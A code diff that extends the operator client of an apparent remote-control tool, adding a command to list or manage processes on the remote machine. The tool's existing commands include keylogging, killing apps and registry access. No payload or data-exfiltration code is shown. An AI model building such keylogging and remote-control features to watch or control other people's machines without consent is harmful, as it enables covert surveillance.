@@ -13,6 +13,7 @@ KEYLOG_MSG = "!KEYLOG"
 GETAPP_MSG = "!GETAPP"
 KILLAPP_MSG = "!KILLAPP"
 REGISTRY_MSG = "!REGISTRY"
+PROCESS_MSG = "!PROCESS"
 
 keylog_on = False
 
@@ -62,10 +63,19 @@ def receiveAppList():
         for j in range(4):
             item.append(receive())
         applist.append({"description": item[0], "app_id": item[1], "path": (item[2]), "thread": item[3]})
-    print("Applist received")
     for item in applist:
         print(item)
 
+def receiveProcessList():
+    process_list_len = int(receive())
+    process_list = []
+    for i in range(process_list_len):
+        item = []
+        for j in range(3):
+            item.append(receive())
+        process_list.append({"pid": item[0], "name": item[1], "thread": (item[2])})
+    for item in process_list:
+        print(item)
 
 def start():
     while True:
@@ -88,6 +98,13 @@ def start():
             print(receive())
         elif msg == GETAPP_MSG:
             receiveAppList()
+        elif msg == PROCESS_MSG:
+            command = input("Enter command: ")
+            send(command)
+            if (command.find("GETPROCESS") != -1):
+                receiveProcessList()
+            else:
+                print(receive())
         elif msg == KILLAPP_MSG:
             app_id = input("Enter app ID to kill: ")
             send(app_id)
